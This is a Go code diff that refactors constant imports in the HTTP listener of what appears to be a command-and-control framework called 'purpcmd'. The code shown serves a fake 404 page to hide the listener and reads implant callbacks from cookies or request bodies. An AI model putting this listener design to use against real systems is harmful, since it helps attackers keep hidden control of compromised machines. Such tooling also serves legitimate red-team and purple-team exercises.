@@ -3,18 +3,19 @@ package listener
 import (
 	"io"
 	"net/http"
-	"purpcmd/server/implant"
+	"purpcmd/internal"
+	imp "purpcmd/server/implant"
 	"strings"
 )
 
 func (l *Listener)root(w http.ResponseWriter, r *http.Request) {
 	a,task := processPayload(r)
 	
-	if uint16(a) == implant.NIL {
+	if uint16(a) == internal.NIL {
 		w.WriteHeader(404)
 		w.Write([]byte("Page Not Found"))
 		return
-	} else if uint16(a) == implant.REG {
+	} else if uint16(a) == internal.REG {
 		l.Association = l.Association + 1
 	}
 
@@ -34,7 +35,7 @@ func processPayload(r *http.Request) (uint16, []byte) {
 	if r.Method == "GET" {
 		cookies := r.Cookies()
 		if len(cookies) == 0 {
-			return implant.NIL, []byte{}
+			return internal.NIL, []byte{}
 		} else {
 			stringReader := strings.NewReader(cookies[0].Value)
 			stringReadCloser = io.NopCloser(stringReader)
@@ -43,5 +44,5 @@ func processPayload(r *http.Request) (uint16, []byte) {
 		stringReadCloser = r.Body
 	}
 
-	return implant.ParseCallback(stringReadCloser, r)
+	return imp.ParseCallback(stringReadCloser, r)
 }
